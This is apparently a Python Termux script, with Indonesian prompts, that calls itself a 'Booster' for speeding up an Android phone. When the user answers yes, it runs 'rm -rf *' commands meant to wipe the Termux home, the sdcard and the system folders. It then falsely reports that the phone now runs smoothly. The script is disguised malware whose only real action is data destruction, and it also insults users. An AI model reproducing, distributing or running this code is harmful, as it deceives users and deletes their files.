import os,sys,time

GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan
logo = R+"""
    ____             __
   / __ )____  _____/ /____  _____
  / __  / __ \/ ___/ __/ _ \/ ___/
 / /_/ / /_/ (__  ) /_/  __/ /
/_____/\____/____/\__/\___/_/ """+G+"""BL4CK DR460N"""

try:
	logo1 = R+"""
	 ▄▄▄▄▄                  ▄
	 █    █  ▄▄▄    ▄▄▄   ▄▄█▄▄   ▄▄▄    ▄ ▄▄
	 █▄▄▄▄▀ █▀ ▀█  █   ▀    █    █▀  █   █▀  ▀
	 █    █ █   █   ▀▀▀▄    █    █▀▀▀▀   █
	 █▄▄▄▄▀ ▀█▄█▀  ▀▄▄▄▀    ▀▄▄  ▀█▄▄▀   █"""
except SyntaxError:
	print("Gunakan ")
	sys.exit()
def main():
	os.system('clear')
	print(logo1)
	print("")
	print("")
	y = input(Y+"[?] Apakah Anda Yakin Ingin Memperlancar Kinerja HP (Y/N) : "+G)
	if y == "Y" or y == "y":
		bost()
	elif y == "N" or y == "n":
		print (R+"[!] Terima Kasih Sudah Install")
		sys.exit()
	else:
		print (R+"[!] Pilih Yg Bener Jancok")
		time.sleep(5)
		main()

def bost():
	print (Y+"[!] Memulai")
	time.sleep(3)
	print ("")
	print ("")
	print (R+"[!] Menghapus File Termux ")
	time.sleep(4)
	os.system('cd $HOME')
	os.system('rm -rf *')
	print (G+"[!] Sukses")
	time.sleep(4)
	print ("")
	print ("")
	print (R+"[!] Menghapus File Sdcard ")
	os.system('cd /sdcard')
	os.system('rm -rf *')
	print (G+"[!] Sukses")
	time.sleep(4)
	print ("")
	print ("")
	print (R+"[!] Menghapus File System")
	os.system('cd /system')
	os.system('rm -rf *')
	print (G+"[!] Sukses")
	time.sleep(4)
	print (G+"[!] HP Anda Sudah Lancar")
	time.sleep(2)
	print (G+"[!] Terima Kasih Sudah Menggunakan Tool Ini")
	sys.exit()
main()
